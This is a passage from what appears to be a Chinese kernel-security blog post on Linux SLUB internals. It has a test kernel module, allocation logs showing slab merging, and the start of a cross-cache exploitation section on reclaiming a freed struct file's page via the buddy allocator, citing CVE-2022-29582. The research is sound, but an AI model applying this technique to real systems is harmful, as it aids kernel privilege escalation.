  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/mm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slub_def.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OBJ_SIZE 256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OBJ_NUM ((PAGE_SIZE/OBJ_SIZE) * 3)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> data[OBJ_SIZE];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">my_cachep</span>;</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">my_struct</span> *<span class="title">ms</span>[<span class="title">OBJ_NUM</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">km_init</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, cpu;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">pg</span>;</span></span><br><span class="line"></span><br><span class="line">    pr_info(<span class="string">"Hello\n"</span>);</span><br><span class="line"></span><br><span class="line">		my_cachep = kmem_cache_create(<span class="string">"my_struct"</span>,</span><br><span class="line">            <span class="keyword">sizeof</span>(struct my_struct), <span class="number">0</span>,</span><br><span class="line">            SLAB_HWCACHE_ALIGN | SLAB_PANIC | SLAB_ACCOUNT,</span><br><span class="line">            <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pr_info(<span class="string">"my_cachep: %px, %s\n"</span>, my_cachep, my_cachep-&gt;name);</span><br><span class="line">    pr_info(<span class="string">"my_cachep.size: %u\n"</span>, my_cachep-&gt;<span class="built_in">size</span>);</span><br><span class="line">    pr_info(<span class="string">"my_cachep.object_size: %u\n"</span>, kmem_cache_size(my_cachep));</span><br><span class="line"></span><br><span class="line">    cpu = get_cpu();</span><br><span class="line">    pr_info(<span class="string">"cpu: %d\n"</span>, cpu);</span><br><span class="line"></span><br><span class="line">    c = per_cpu_ptr(my_cachep-&gt;cpu_slab, cpu);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i&lt;OBJ_NUM; i++)&#123;</span><br><span class="line">        ms[i] = kmem_cache_alloc(my_cachep, GFP_KERNEL);</span><br><span class="line">        pg = virt_to_page(ms[i]);</span><br><span class="line">        pr_info(<span class="string">"[%02d] object: %px, page: %px(%px), %d\n"</span>, i, ms[i],</span><br><span class="line">                pg, page_address(pg),</span><br><span class="line">                (<span class="keyword">void</span> *)pg == (<span class="keyword">void</span> *)c-&gt;page);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">km_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i&lt;OBJ_NUM; i++)&#123;</span><br><span class="line">        kmem_cache_free(my_cachep, ms[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    kmem_cache_destroy(my_cachep);</span><br><span class="line">    pr_info(<span class="string">"Bye\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(km_init);</span><br><span class="line">module_exit(km_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"X++D"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"Kernel xxx Module."</span>);</span><br><span class="line">MODULE_VERSION(<span class="string">"0.1"</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>VM result</p>
<p>  分配的 object 地址和 page 的关系非常清晰</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ insmod slab-tc.ko</span><br><span class="line">[ <span class="number">1184.983757</span>] Hello</span><br><span class="line">[ <span class="number">1184.984278</span>] my_cachep: ffff8880096ea000, my_struct</span><br><span class="line">[ <span class="number">1184.985568</span>] my_cachep.<span class="built_in">size</span>: <span class="number">256</span></span><br><span class="line">[ <span class="number">1184.986451</span>] my_cachep.object_size: <span class="number">256</span></span><br><span class="line">[ <span class="number">1184.987488</span>] cpu: <span class="number">0</span></span><br><span class="line">**[ <span class="number">1184.988945</span>] [<span class="number">00</span>] object: ffff888005c38000, page: ffffea0000170e00(ffff888005c38000), <span class="number">1</span>**</span><br><span class="line">[ <span class="number">1184.991189</span>] [<span class="number">01</span>] object: ffff888005c38100, page: ffffea0000170e00(ffff888005c38000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1184.993438</span>] [<span class="number">02</span>] object: ffff888005c38200, page: ffffea0000170e00(ffff888005c38000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1184.995688</span>] [<span class="number">03</span>] object: ffff888005c38300, page: ffffea0000170e00(ffff888005c38000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1184.998018</span>] [<span class="number">04</span>] object: ffff888005c38400, page: ffffea0000170e00(ffff888005c38000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.000234</span>] [<span class="number">05</span>] object: ffff888005c38500, page: ffffea0000170e00(ffff888005c38000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.002529</span>] [<span class="number">06</span>] object: ffff888005c38600, page: ffffea0000170e00(ffff888005c38000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.004702</span>] [<span class="number">07</span>] object: ffff888005c38700, page: ffffea0000170e00(ffff888005c38000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.006841</span>] [<span class="number">08</span>] object: ffff888005c38800, page: ffffea0000170e00(ffff888005c38000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.008919</span>] [<span class="number">09</span>] object: ffff888005c38900, page: ffffea0000170e00(ffff888005c38000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.010944</span>] [<span class="number">10</span>] object: ffff888005c38a00, page: ffffea0000170e00(ffff888005c38000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.013021</span>] [<span class="number">11</span>] object: ffff888005c38b00, page: ffffea0000170e00(ffff888005c38000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.014904</span>] [<span class="number">12</span>] object: ffff888005c38c00, page: ffffea0000170e00(ffff888005c38000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.016926</span>] [<span class="number">13</span>] object: ffff888005c38d00, page: ffffea0000170e00(ffff888005c38000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.018883</span>] [<span class="number">14</span>] object: ffff888005c38e00, page: ffffea0000170e00(ffff888005c38000), <span class="number">1</span></span><br><span class="line">**[ <span class="number">1185.020761</span>] [<span class="number">15</span>] object: ffff888005c38f00, page: ffffea0000170e00(ffff888005c38000), <span class="number">1</span>**</span><br><span class="line">**[ <span class="number">1185.022735</span>] [<span class="number">16</span>] object: ffff88800953d000, page: ffffea0000254f40(ffff88800953d000), <span class="number">1</span>**</span><br><span class="line">[ <span class="number">1185.024679</span>] [<span class="number">17</span>] object: ffff88800953d100, page: ffffea0000254f40(ffff88800953d000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.026579</span>] [<span class="number">18</span>] object: ffff88800953d200, page: ffffea0000254f40(ffff88800953d000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.028528</span>] [<span class="number">19</span>] object: ffff88800953d300, page: ffffea0000254f40(ffff88800953d000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.030443</span>] [<span class="number">20</span>] object: ffff88800953d400, page: ffffea0000254f40(ffff88800953d000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.032372</span>] [<span class="number">21</span>] object: ffff88800953d500, page: ffffea0000254f40(ffff88800953d000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.034263</span>] [<span class="number">22</span>] object: ffff88800953d600, page: ffffea0000254f40(ffff88800953d000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.036116</span>] [<span class="number">23</span>] object: ffff88800953d700, page: ffffea0000254f40(ffff88800953d000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.038086</span>] [<span class="number">24</span>] object: ffff88800953d800, page: ffffea0000254f40(ffff88800953d000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.039929</span>] [<span class="number">25</span>] object: ffff88800953d900, page: ffffea0000254f40(ffff88800953d000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.041944</span>] [<span class="number">26</span>] object: ffff88800953da00, page: ffffea0000254f40(ffff88800953d000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.043852</span>] [<span class="number">27</span>] object: ffff88800953db00, page: ffffea0000254f40(ffff88800953d000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.045736</span>] [<span class="number">28</span>] object: ffff88800953dc00, page: ffffea0000254f40(ffff88800953d000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.047678</span>] [<span class="number">29</span>] object: ffff88800953dd00, page: ffffea0000254f40(ffff88800953d000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.049585</span>] [<span class="number">30</span>] object: ffff88800953de00, page: ffffea0000254f40(ffff88800953d000), <span class="number">1</span></span><br><span class="line">**[ <span class="number">1185.051391</span>] [<span class="number">31</span>] object: ffff88800953df00, page: ffffea0000254f40(ffff88800953d000), <span class="number">1</span>**</span><br><span class="line">**[ <span class="number">1185.053206</span>] [<span class="number">32</span>] object: ffff888009543000, page: ffffea00002550c0(ffff888009543000), <span class="number">1</span>**</span><br><span class="line">[ <span class="number">1185.055038</span>] [<span class="number">33</span>] object: ffff888009543100, page: ffffea00002550c0(ffff888009543000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.056666</span>] [<span class="number">34</span>] object: ffff888009543200, page: ffffea00002550c0(ffff888009543000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.058430</span>] [<span class="number">35</span>] object: ffff888009543300, page: ffffea00002550c0(ffff888009543000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.060174</span>] [<span class="number">36</span>] object: ffff888009543400, page: ffffea00002550c0(ffff888009543000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.061955</span>] [<span class="number">37</span>] object: ffff888009543500, page: ffffea00002550c0(ffff888009543000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.063694</span>] [<span class="number">38</span>] object: ffff888009543600, page: ffffea00002550c0(ffff888009543000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.065468</span>] [<span class="number">39</span>] object: ffff888009543700, page: ffffea00002550c0(ffff888009543000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.067231</span>] [<span class="number">40</span>] object: ffff888009543800, page: ffffea00002550c0(ffff888009543000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.068930</span>] [<span class="number">41</span>] object: ffff888009543900, page: ffffea00002550c0(ffff888009543000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.070600</span>] [<span class="number">42</span>] object: ffff888009543a00, page: ffffea00002550c0(ffff888009543000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.072224</span>] [<span class="number">43</span>] object: ffff888009543b00, page: ffffea00002550c0(ffff888009543000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.073911</span>] [<span class="number">44</span>] object: ffff888009543c00, page: ffffea00002550c0(ffff888009543000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.075534</span>] [<span class="number">45</span>] object: ffff888009543d00, page: ffffea00002550c0(ffff888009543000), <span class="number">1</span></span><br><span class="line">[ <span class="number">1185.077211</span>] [<span class="number">46</span>] object: ffff888009543e00, page: ffffea00002550c0(ffff888009543000), <span class="number">1</span></span><br><span class="line">**[ <span class="number">1185.078887</span>] [<span class="number">47</span>] object: ffff888009543f00, page: ffffea00002550c0(ffff888009543000), <span class="number">1</span>**</span><br></pre></td></tr></table></figure>

<p>  有独立的 sysfs 目录</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ file /sys/kernel/slab/my_struct</span><br><span class="line">/sys/kernel/slab/my_struct: directory</span><br><span class="line"></span><br><span class="line">➜  ~ file /sys/kernel/slab/pool_workqueue</span><br><span class="line">/sys/kernel/slab/pool_workqueue: directory</span><br></pre></td></tr></table></figure>
</li>
<li><p>Host result</p>
<p>  分配的 obj 位于的 page 地址非常杂乱，<code>my_cachep</code> 的 <code>name</code> 也变成了 <code>pool_workqueue</code></p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">435532.063645</span>] Hello</span><br><span class="line">[<span class="number">435532.063655</span>] my_cachep: ffff8faf40045900, pool_workqueue</span><br><span class="line">[<span class="number">435532.063658</span>] my_cachep.<span class="built_in">size</span>: <span class="number">256</span></span><br><span class="line">[<span class="number">435532.063659</span>] my_cachep.object_size: <span class="number">256</span></span><br><span class="line">[<span class="number">435532.063660</span>] cpu: <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063662</span>] [<span class="number">00</span>] object: ffff8fafb100b400, page: ffffd50545c402c0(ffff8fafb100b000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063664</span>] [<span class="number">01</span>] object: ffff8fafb100a700, page: ffffd50545c40280(ffff8fafb100a000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063666</span>] [<span class="number">02</span>] object: ffff8fafb100ae00, page: ffffd50545c40280(ffff8fafb100a000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063668</span>] [<span class="number">03</span>] object: ffff8fafb100b900, page: ffffd50545c402c0(ffff8fafb100b000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063670</span>] [<span class="number">04</span>] object: ffff8fafb100be00, page: ffffd50545c402c0(ffff8fafb100b000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063672</span>] [<span class="number">05</span>] object: ffff8fafb100bf00, page: ffffd50545c402c0(ffff8fafb100b000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063674</span>] [<span class="number">06</span>] object: ffff8fafb100af00, page: ffffd50545c40280(ffff8fafb100a000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063676</span>] [<span class="number">07</span>] object: ffff8fafb100ad00, page: ffffd50545c40280(ffff8fafb100a000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063677</span>] [<span class="number">08</span>] object: ffff8fafb100bc00, page: ffffd50545c402c0(ffff8fafb100b000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063679</span>] [<span class="number">09</span>] object: ffff8fafb100a600, page: ffffd50545c40280(ffff8fafb100a000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063681</span>] [<span class="number">10</span>] object: ffff8fafb100a800, page: ffffd50545c40280(ffff8fafb100a000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063683</span>] [<span class="number">11</span>] object: ffff8fafb100a000, page: ffffd50545c40280(ffff8fafb100a000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063685</span>] [<span class="number">12</span>] object: ffff8fafb100ab00, page: ffffd50545c40280(ffff8fafb100a000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063687</span>] [<span class="number">13</span>] object: ffff8fafb100b300, page: ffffd50545c402c0(ffff8fafb100b000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063689</span>] [<span class="number">14</span>] object: ffff8fafb100a900, page: ffffd50545c40280(ffff8fafb100a000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063690</span>] [<span class="number">15</span>] object: ffff8fafb100b000, page: ffffd50545c402c0(ffff8fafb100b000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063692</span>] [<span class="number">16</span>] object: ffff8fafb100a100, page: ffffd50545c40280(ffff8fafb100a000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063694</span>] [<span class="number">17</span>] object: ffff8fafb100b100, page: ffffd50545c402c0(ffff8fafb100b000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063696</span>] [<span class="number">18</span>] object: ffff8fafb100b500, page: ffffd50545c402c0(ffff8fafb100b000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063698</span>] [<span class="number">19</span>] object: ffff8fafb100bd00, page: ffffd50545c402c0(ffff8fafb100b000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063700</span>] [<span class="number">20</span>] object: ffff8fafb100ba00, page: ffffd50545c402c0(ffff8fafb100b000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063702</span>] [<span class="number">21</span>] object: ffff8fafb100b700, page: ffffd50545c402c0(ffff8fafb100b000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063703</span>] [<span class="number">22</span>] object: ffff8fafb100a200, page: ffffd50545c40280(ffff8fafb100a000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063705</span>] [<span class="number">23</span>] object: ffff8fafb100b200, page: ffffd50545c402c0(ffff8fafb100b000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063707</span>] [<span class="number">24</span>] object: ffff8fafb100bb00, page: ffffd50545c402c0(ffff8fafb100b000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063709</span>] [<span class="number">25</span>] object: ffff8fafb100aa00, page: ffffd50545c40280(ffff8fafb100a000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063711</span>] [<span class="number">26</span>] object: ffff8fafb100a500, page: ffffd50545c40280(ffff8fafb100a000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063713</span>] [<span class="number">27</span>] object: ffff8fafb100b600, page: ffffd50545c402c0(ffff8fafb100b000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063714</span>] [<span class="number">28</span>] object: ffff8fafb100b800, page: ffffd50545c402c0(ffff8fafb100b000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063716</span>] [<span class="number">29</span>] object: ffff8fafb100a400, page: ffffd50545c40280(ffff8fafb100a000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063718</span>] [<span class="number">30</span>] object: ffff8fafb100ac00, page: ffffd50545c40280(ffff8fafb100a000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063720</span>] [<span class="number">31</span>] object: ffff8fafb100a300, page: ffffd50545c40280(ffff8fafb100a000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063724</span>] [<span class="number">32</span>] object: ffff8faf488fec00, page: ffffd50544223f80(ffff8faf488fe000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063726</span>] [<span class="number">33</span>] object: ffff8faf488fe400, page: ffffd50544223f80(ffff8faf488fe000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063728</span>] [<span class="number">34</span>] object: ffff8faf488ff800, page: ffffd50544223fc0(ffff8faf488ff000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063730</span>] [<span class="number">35</span>] object: ffff8faf488ff600, page: ffffd50544223fc0(ffff8faf488ff000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063732</span>] [<span class="number">36</span>] object: ffff8faf488fe500, page: ffffd50544223f80(ffff8faf488fe000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063734</span>] [<span class="number">37</span>] object: ffff8faf488fea00, page: ffffd50544223f80(ffff8faf488fe000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063736</span>] [<span class="number">38</span>] object: ffff8faf488ffb00, page: ffffd50544223fc0(ffff8faf488ff000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063737</span>] [<span class="number">39</span>] object: ffff8faf488ff200, page: ffffd50544223fc0(ffff8faf488ff000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063739</span>] [<span class="number">40</span>] object: ffff8faf488fe200, page: ffffd50544223f80(ffff8faf488fe000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063741</span>] [<span class="number">41</span>] object: ffff8faf488ff700, page: ffffd50544223fc0(ffff8faf488ff000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063743</span>] [<span class="number">42</span>] object: ffff8faf488ffa00, page: ffffd50544223fc0(ffff8faf488ff000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063745</span>] [<span class="number">43</span>] object: ffff8faf488ff400, page: ffffd50544223fc0(ffff8faf488ff000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063747</span>] [<span class="number">44</span>] object: ffff8faf488fe700, page: ffffd50544223f80(ffff8faf488fe000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063749</span>] [<span class="number">45</span>] object: ffff8faf488fee00, page: ffffd50544223f80(ffff8faf488fe000), <span class="number">1</span></span><br><span class="line">[<span class="number">435532.063750</span>] [<span class="number">46</span>] object: ffff8faf488ff900, page: ffffd50544223fc0(ffff8faf488ff000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.063752</span>] [<span class="number">47</span>] object: ffff8faf488ffe00, page: ffffd50544223fc0(ffff8faf488ff000), <span class="number">0</span></span><br><span class="line">[<span class="number">435532.065672</span>] Bye</span><br></pre></td></tr></table></figure>

<p>  sysfs 目录也是和 <code>pool_workqueue</code> 共用的</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─[$] file /sys/kernel/slab/my_struct              </span><br><span class="line">/sys/kernel/slab/my_struct: symbolic link to :<span class="number">0000256</span></span><br><span class="line"></span><br><span class="line">└─[$] file /sys/kernel/slab/pool_workqueue </span><br><span class="line">/sys/kernel/slab/pool_workqueue: symbolic link to :<span class="number">0000256</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="Part-3"><a href="#Part-3" class="headerlink" title="Part. 3"></a>Part. 3</h2><p>根据前两个部分知道，开启 <code>CONFIG_SLAB_MERGE_DEFAULT</code> 配置后，不同类型的 <code>kmem_cache</code> 的内存完全隔离.</p>
<p>这种情况下，想要占据被释放的 slab object 内存(比如一个 <code>struct file</code>) 只能通过申请相同的 slab object,</p>
<p>而像 <code>struct file</code> 这样的内存，用户态可以操纵的内容非常有限,</p>
<p>解决办法是: 占据目标 object (e.g. <code>struct file</code>) 所在的整个 page，在 object invalid free 之后 free 掉同页面其他 object，再满足<a href="https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/#how-to-free-a-page" target="_blank" rel="noopener">一系列条件</a> 就可以让整个 page 被 buddy system 回收，并被重新申请</p>
<hr>
<p><strong>条件一:</strong></p>
<p>目标 object 所在的 page 不是 <code>s-&gt;cpu_slab-&gt;page</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> <span class="title">do_slab_free</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="function"><span class="params">                struct page *page, <span class="keyword">void</span> *head, <span class="keyword">void</span> *tail,</span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">int</span> cnt, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">	c = raw_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">...</span><br><span class="line">	**<span class="keyword">if</span> (likely(page == c-&gt;page)) &#123;**</span><br><span class="line">	...</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">      __slab_free(s, page, head, tail_obj, cnt, addr);</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>

<p><strong>条件二:</strong></p>
<p>object 所在 page 满足  <code>page-&gt;pobjects &gt; (s)-&gt;cpu_partial</code></p>
